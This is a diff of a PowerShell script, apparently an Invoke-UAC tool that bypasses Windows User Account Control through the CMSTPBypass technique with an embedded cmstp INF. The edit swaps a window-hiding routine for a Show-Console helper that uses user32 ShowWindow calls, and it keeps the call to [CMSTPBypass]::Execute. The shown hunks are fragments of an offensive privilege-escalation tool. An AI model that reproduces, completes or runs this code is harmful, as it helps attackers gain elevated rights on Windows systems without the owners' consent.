@@ -1,6 +1,6 @@
 function Invoke-UAC
 {
-
+Show-Console
 <#
  
 .SYNOPSIS
@@ -162,42 +162,52 @@ ShortSvcName=""CorpVPN""
 
 }
 "@
-function showwindow(){
+function Show-Console
+{
+    param ([Switch]$Show,[Switch]$Hide)
+    if (-not ("Console.Window" -as [type])) { 
 
+        Add-Type -Name Window -Namespace Console -MemberDefinition '
+        [DllImport("Kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+        '
+    }
+
+    if ($Show)
+    {
+        $consolePtr = [Console.Window]::GetConsoleWindow()
+
+        # Hide = 0,
+        # ShowNormal = 1,
+        # ShowMinimized = 2,
+        # ShowMaximized = 3,
+        # Maximize = 3,
+        # ShowNormalNoActivate = 4,
+        # Show = 5,
+        # Minimize = 6,
+        # ShowMinNoActivate = 7,
+        # ShowNoActivate = 8,
+        # Restore = 9,
+        # ShowDefault = 10,
+        # ForceMinimized = 11
+
+        $null = [Console.Window]::ShowWindow($consolePtr, 5)
+    }
+
+    if ($Hide)
+    {
+        $consolePtr = [Console.Window]::GetConsoleWindow()
+        #0 hide
+        $null = [Console.Window]::ShowWindow($consolePtr, 0)
+    }
 }
 function Execute {
     try 
     {
-    Add-Type @'
-using System;
-using System.Runtime.InteropServices;
-
-public class API {
-
-    public enum SW : int {
-        Hide            = 0,
-        Normal          = 1,
-        ShowMinimized   = 2,
-        Maximize        = 3,
-        ShowNoActivate  = 4,
-        Show            = 5,
-        Minimize        = 6,
-        ShowMinNoActive = 7,
-        ShowNA          = 8,
-        Restore         = 9,
-        Showdefault     = 10,
-        Forceminimize   = 11
-    }
-
-    [DllImport("user32.dll")]
-    public static extern int ShowWindow(IntPtr hwnd, SW nCmdShow);
-}
-'@
-
-       $ThisWindow = [System.Diagnostics.Process]::GetCurrentProcess().MainwindowHandle
-       [API]::ShowWindow($ThisWindow,'Hide')
-       sleep -Seconds 5
-       [API]::ShowWindow($ThisWindow,'Show')
+    
         $result = [CMSTPBypass]::Execute($final) 
     } 
     catch 
